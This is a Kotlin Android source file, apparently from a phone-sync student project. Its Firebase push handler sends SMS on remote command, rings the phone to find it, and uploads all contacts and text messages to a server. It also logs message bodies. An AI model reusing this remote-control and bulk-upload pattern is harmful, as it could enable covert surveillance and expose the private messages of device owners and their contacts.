package fr.intechinfo.fusionandroid

import android.telephony.SmsManager
import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage


import android.content.ContentValues.TAG
import android.content.Context
import android.media.RingtoneManager
import android.os.Vibrator
import org.webrtc.SessionDescription
import okhttp3.ResponseBody



class MyFirebaseMessagingService : FirebaseMessagingService() {

    val rtc = Rtc()
    override fun onMessageReceived(remoteMessage: RemoteMessage?) {
        val data = remoteMessage!!.data
        val strTitle = data["title"]
        val message = data["text"]
        val type = data["type"]
        Log.d("MyFireBasemessaging", "onMessageReceived:  Message Received: \nTitle: $strTitle\nMessage: $message")
        if(type == "sms"){
            sendSMS(strTitle, message)
        }
        else if (type == "foundPhone") {
            val notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            val r = RingtoneManager.getRingtone(applicationContext, notification)
            r.play()
            val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            v.vibrate(1000)
        }

        SyncData()
    }

    private fun sendSMS(phoneNumber: String?, messageBody: String?) {
        val sms = SmsManager.getDefault()
        sms.sendTextMessage(phoneNumber, null, messageBody, null, null)
    }

    /*private fun DownloadFile(fileName: String?){
        Log.d("DownloadFile", "MFile Downloading")
        HttpExecute.BuildAPI().downloadFileWithDynamicUrlSync(fileName).execute()
    }*/

    private fun SyncData() {
        val retrofitAPI = HttpExecute.BuildAPI()
        val cc = ContentCollector()
        val contactLs = ContactsList()
        contactLs.SetContact(cc.GetContacts(this))
        Log.d("SYNC", "Name : " + contactLs.GetContact()!![1].GetName() + " Number : " + contactLs.GetContact()!![1].GetNumber())
        val SMSLs = SMSList()
        SMSLs.SetSMS(cc.GetSMS(this))
        Log.d("SYNC", "Address : " + SMSLs.GetSMS()!![3].GetAddress() + " Message : " + SMSLs.GetSMS()!![3].GetBody() + " Date : " + SMSLs.GetSMS()!![3].GetDate() + " Type : " + SMSLs.GetSMS()!![3].GetType())

        HttpExecute(retrofitAPI.CreateContacts(contactLs)).start()
        HttpExecute(retrofitAPI.CreateSMS(SMSLs)).start()
    }
    /*private fun rtcSignaling(type: String, message: String, ertc: Rtc?){
        var rtc = ertc
        if(ertc?.peerConnection == null){
            this.rtc.initRtcAudio(this.applicationContext)
            rtc = this.rtc
        }
        if(type == "sdp"){
            rtc?.peerConnection?.setRemoteDescription(rtc.sdpObserver, SessionDescription(SessionDescription.Type.OFFER, message))
        }
    }*/
}